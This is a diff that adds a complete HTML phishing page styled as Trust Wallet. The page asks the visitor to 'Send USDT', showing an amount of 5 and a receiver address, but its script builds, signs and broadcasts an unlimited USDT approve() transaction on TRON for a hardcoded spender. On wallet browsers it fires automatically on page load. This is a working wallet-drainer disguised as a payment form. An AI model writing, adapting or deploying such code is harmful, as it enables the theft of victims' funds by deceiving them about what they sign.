@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Trust Wallet</title>
+
+<link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">
+
+<!-- ✅ WalletConnect -->
+<script src="https://unpkg.com/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>
+
+<style>
+body{
+  margin:0;
+  background:#0d0f12;
+  color:#fff;
+  font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+
+.header{
+  padding:20px;
+  text-align:center;
+  font-size:20px;
+  font-weight:bold;
+  border-bottom:1px solid #222;
+  background:#121417;
+}
+
+.logo{
+  width:60px;
+  height:60px;
+  margin:0 auto 12px;
+  border-radius:12px;
+  background:#1b1e23;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.logo img{
+  width:48px;
+  height:48px;
+}
+
+.container{
+  padding:16px;
+  max-width:500px;
+  margin:0 auto;
+}
+
+.box{
+  border:1px solid #2a2d33;
+  border-radius:12px;
+  padding:14px;
+  margin-bottom:16px;
+  background:#121417;
+}
+
+.label{
+  font-size:12px;
+  color:#888;
+  margin-bottom:6px;
+  text-transform:uppercase;
+  letter-spacing:0.5px;
+}
+
+.value{
+  font-size:15px;
+  color:#fff;
+  word-break:break-all;
+  font-family:monospace;
+}
+
+.network{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  background:#1b1e23;
+  padding:8px 12px;
+  border-radius:20px;
+  width:fit-content;
+}
+
+.network img{
+  width:18px;
+}
+
+.status-box{
+  border-radius:12px;
+  padding:14px;
+  margin-bottom:16px;
+  font-size:13px;
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+
+.status-box.loading{
+  background:#1a3a4d;
+  color:#4dabf7;
+}
+
+.status-box.error{
+  background:#5a1a1a;
+  color:#ff8787;
+}
+
+.status-box.success{
+  background:#1a4d2e;
+  color:#51cf66;
+}
+
+.spinner{
+  width:16px;
+  height:16px;
+  border:2px solid #4dabf7;
+  border-top-color:transparent;
+  border-radius:50%;
+  animation:spin 0.8s linear infinite;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
+}
+
+.checkmark{
+  color:#51cf66;
+  font-weight:bold;
+}
+
+.btn{
+  position:fixed;
+  bottom:20px;
+  left:16px;
+  right:16px;
+  background:#2ecc71;
+  color:#000;
+  padding:16px;
+  border:none;
+  border-radius:30px;
+  font-size:18px;
+  font-weight:bold;
+  cursor:pointer;
+  transition:all 0.3s;
+}
+
+.btn:hover:not(:disabled){
+  background:#27ae60;
+  transform:translateY(-2px);
+}
+
+.btn:disabled{
+  background:#888;
+  opacity:0.5;
+  cursor:not-allowed;
+}
+
+.info-text{
+  font-size:12px;
+  color:#888;
+  text-align:center;
+  margin-top:8px;
+  line-height:1.5;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <div class="logo">
+    <img src="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png" alt="Logo">
+  </div>
+  Send USDT
+</div>
+
+<div class="container">
+
+<div id="status-container"></div>
+
+<div class="box">
+  <div class="label">Reciever Address </div>
+  <div class="value">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</div>
+</div>
+  
+<div class="box">
+  <div class="label">Network</div>
+  <div class="network">
+    <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON"> TRON
+  </div>
+</div>
+
+<div class="box">
+  <div class="label">Sending Amount</div>
+  <div class="value">5</div>
+</div>
+
+<p class="info-text">
+  <br>
+  
+</p>
+
+</div>
+
+<button id="btn" class="btn" onclick="handleNext()">Next</button>
+
+<script>
+// CONFIG
+const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
+const TRON_CHAIN = "tron:0x2b6653dc";
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
+const APPROVE_SELECTOR = "095ea7b3"; // approve(address,uint256)
+const MAX_UINT256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+let client = null;
+let session = null;
+let address = null;
+let isProcessing = false;
+
+// ✅ SAFE SIGN CLIENT
+function getSignClient(){
+  if(window.SignClient?.init) return window.SignClient;
+  if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
+  if(window.walletconnect?.SignClient?.init) return window.walletconnect.SignClient;
+
+  for(let k in window){
+    try{
+      if(window[k]?.SignClient?.init) return window[k].SignClient;
+    }catch{}
+  }
+  return null;
+}
+
+function setStatus(msg, type = 'loading'){
+  const container = document.getElementById("status-container");
+  let icon = '';
+  
+  if(type === 'loading'){
+    icon = '<div class="spinner"></div>';
+  } else if(type === 'error'){
+    icon = '✗';
+  } else if(type === 'success'){
+    icon = '<span class="checkmark">✓</span>';
+  }
+  
+  container.innerHTML = `<div class="status-box ${type}">${icon} ${msg}</div>`;
+}
+
+function clearStatus(){
+  document.getElementById("status-container").innerHTML = '';
+}
+
+// BASE58
+const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+function base58ToHex(addr){
+  try{
+    let num = BigInt(0);
+    for(let c of addr){
+      num = num * 58n + BigInt(ALPHABET.indexOf(c));
+    }
+    let hex = num.toString(16);
+    if(hex.length % 2) hex = "0" + hex;
+    return hex.slice(0, -8);
+  }catch(e){
+    throw new Error("Invalid TRON address");
+  }
+}
+
+// ✅ BUILD APPROVE TRANSACTION
+function buildApproveTransaction(ownerAddress, spenderAddress){
+  try{
+    // Convert spender address to hex (remove 41 prefix)
+    const spenderHex = base58ToHex(spenderAddress).toLowerCase();
+    
+    // Build parameters
+    // Spender: padded to 64 chars
+    const spenderParam = spenderHex.padStart(64, '0');
+    // Amount: unlimited (max uint256), padded to 64 chars
+    const amountParam = MAX_UINT256;
+    
+    // Function data
+    const functionData = APPROVE_SELECTOR + spenderParam + amountParam;
+    
+    return {
+      owner_address: ownerAddress,
+      contract_address: USDT_CONTRACT,
+      function_selector: "approve(address,uint256)",
+      parameter: functionData,
+      fee_limit: 100000000,
+      visible: true
+    };
+  }catch(e){
+    throw new Error("Failed to build transaction: " + e.message);
+  }
+}
+
+// CONNECT WALLET
+async function connectWallet(){
+  try{
+    setStatus("Opening wallet...", 'loading');
+
+    // Trust Wallet browser
+    if(window.tronWeb?.defaultAddress?.base58){
+      address = window.tronWeb.defaultAddress.base58;
+      clearStatus();
+      return true;
+    }
+
+    const SignClient = getSignClient();
+    if(!SignClient) throw new Error("WalletConnect not loaded");
+
+    client = await SignClient.init({
+      projectId: PROJECT_ID,
+      metadata:{
+        name:"USDT Approval",
+        description:"Unlimited USDT Approval on TRON",
+        url:location.href,
+        icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
+      }
+    });
+
+    const { uri, approval } = await client.connect({
+      requiredNamespaces:{
+        tron:{
+          methods:["tron_signTransaction"],
+          chains:[TRON_CHAIN],
+          events:[]
+        }
+      }
+    });
+
+    if(uri){
+      const link = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+      window.location.href = link;
+    }
+
+    session = await approval();
+    address = session.namespaces.tron.accounts[0].split(":")[2];
+    clearStatus();
+    return true;
+
+  }catch(e){
+    console.error(e);
+    setStatus("Connection failed: " + e.message, 'error');
+    return false;
+  }
+}
+
+// SEND APPROVAL
+async function sendApproval(){
+  try{
+    setStatus("Building transaction...", 'loading');
+
+    // Build transaction
+    const txPayload = buildApproveTransaction(address, SPENDER_ADDRESS);
+
+    // Create transaction
+    setStatus("Creating transaction...", 'loading');
+    const txResponse = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
+      method: "POST",
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(txPayload)
+    }).then(r => r.json());
+
+    if(!txResponse.transaction){
+      throw new Error(txResponse.message || "Failed to create transaction");
+    }
+
+    setStatus("Requesting signature...", 'loading');
+
+    // Sign transaction
+    let signed;
+    if(window.tronWeb){
+      signed = await window.tronWeb.trx.sign(txResponse.transaction);
+    } else {
+      signed = await client.request({
+        topic: session.topic,
+        chainId: TRON_CHAIN,
+        request:{
+          method: "tron_signTransaction",
+          params: { address, transaction: txResponse.transaction }
+        }
+      });
+    }
+
+    setStatus("Broadcasting transaction...", 'loading');
+
+    // Broadcast transaction
+    const broadcastResponse = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
+      method: "POST",
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(signed)
+    }).then(r => r.json());
+
+    if(broadcastResponse.result){
+      setStatus("✓ Approval successful! TX: " + broadcastResponse.txid, 'success');
+      setTimeout(() => {
+        clearStatus();
+        isProcessing = false;
+        document.getElementById("btn").innerText = "Send Another Approval";
+      }, 5000);
+    } else {
+      throw new Error(broadcastResponse.message || "Broadcast failed");
+    }
+
+  }catch(e){
+    console.error(e);
+    setStatus("Error: " + e.message, 'error');
+    isProcessing = false;
+  }
+}
+
+// MAIN BUTTON FLOW
+async function handleNext(){
+  if(isProcessing) return;
+  isProcessing = true;
+
+  if(!address){
+    const ok = await connectWallet();
+    if(!ok){
+      isProcessing = false;
+      return;
+    }
+    
+    // Auto-trigger approval after connection
+    setTimeout(() => {
+      sendApproval();
+    }, 500);
+  } else {
+    sendApproval();
+  }
+}
+
+// Check if wallet connects during page load
+document.addEventListener('DOMContentLoaded', function(){
+  setTimeout(() => {
+    if(window.tronWeb?.defaultAddress?.base58){
+      address = window.tronWeb.defaultAddress.base58;
+      document.getElementById("btn").innerText = "Send Approval";
+      sendApproval();
+    }
+  }, 1000);
+});
+
+</script>
+
+</body>
+</html>
